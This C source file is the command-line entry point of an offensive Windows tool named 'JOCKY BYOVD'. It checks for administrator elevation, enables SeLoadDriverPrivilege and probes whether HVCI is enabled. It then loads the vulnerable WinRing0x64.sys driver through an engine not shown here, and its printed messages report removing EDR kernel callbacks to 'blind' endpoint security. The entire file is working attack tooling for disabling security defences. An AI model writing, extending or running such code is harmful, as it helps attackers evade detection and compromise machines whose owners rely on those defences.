/*
 * jocky_byovd_main.c -- JOCKY BYOVD: CLI entry point
 * byovd/kernel_subverter/jocky_byovd_main.c
 * Windows x64 | Clang | ring-3
 */
#include "byovd.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>

static BOOL is_elevated(void) {
    BOOL e=FALSE; HANDLE h=NULL;
    if (!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&h)) return FALSE;
    TOKEN_ELEVATION te; DWORD sz=sizeof(te);
    if (GetTokenInformation(h,TokenElevation,&te,sizeof(te),&sz))
        e=(te.TokenIsElevated!=0);
    CloseHandle(h); return e;
}

static BOOL enable_load_driver_priv(void) {
    HANDLE h=NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&h)) return FALSE;
    LUID l; LookupPrivilegeValueA(NULL,"SeLoadDriverPrivilege",&l);
    TOKEN_PRIVILEGES tp={1,{{l,SE_PRIVILEGE_ENABLED}}};
    AdjustTokenPrivileges(h,FALSE,&tp,sizeof(tp),NULL,NULL);
    DWORD err=GetLastError(); CloseHandle(h);
    return (err!=ERROR_NOT_ALL_ASSIGNED);
}

static void check_hvci(void) {
    HKEY hk=NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\"
        "Scenarios\\HypervisorEnforcedCodeIntegrity",
        0,KEY_READ,&hk)!=ERROR_SUCCESS) {
        printf("[main] HVCI: disabled or not detected\n"); return;
    }
    DWORD val=0,sz=sizeof(val),type=0;
    RegQueryValueExA(hk,"Enabled",NULL,&type,(BYTE*)&val,&sz);
    RegCloseKey(hk);
    if (type==REG_DWORD && val==1) {
        printf("[main] WARNING: HVCI ENABLED -- driver may fail to load\n");
    } else {
        printf("[main] HVCI: disabled or not detected\n");
    }
}

int main(int argc, char **argv) {
    const char *driver_path=NULL;
    for (int i=1;i<argc;i++) {
        if (!driver_path) driver_path=argv[i];
    }
    if (!driver_path) {
        printf("Usage: jocky_byovd.exe <WinRing0x64.sys>\n");
        return 1;
    }

    printf("\n");
    printf("  JOCKY BYOVD Engine\n");
    printf("  backend: WinRing0x64  |  Win11 24H2 x64\n");
    printf("  ----------------------------------------\n\n");

    if (!is_elevated()) {
        printf("[main] NOT elevated -- run from Administrator PowerShell\n");
        return 1;
    }
    printf("[main] elevated: ok\n");
    check_hvci();
    if (!enable_load_driver_priv()) {
        printf("[main] SeLoadDriverPrivilege: FAILED\n"); return 1;
    }
    printf("[main] SeLoadDriverPrivilege: ok\n\n");

    char abs[MAX_PATH]={0};
    GetFullPathNameA(driver_path,MAX_PATH,abs,NULL);
    if (GetFileAttributesA(abs)==INVALID_FILE_ATTRIBUTES) {
        printf("[main] driver not found: %s\n",abs); return 1;
    }
    printf("[main] driver: %s\n",abs);

    byovd_backend_t *backend = byovd_engine_init(BYOVD_BACKEND_WINRING0, abs);
    if (!backend) { printf("[main] engine init FAILED\n"); return 1; }

    int removed = byovd_engine_run(backend);
    byovd_engine_cleanup(backend);

    printf("\n[main] session complete\n");
    if (removed>=0)
        printf("[main] %d EDR callback(s) removed from kernel\n",removed);
    else
        printf("[main] blinding sequence failed\n");

    printf("\nPress Enter to exit...\n"); getchar();
    return (removed>=0)?0:1;
}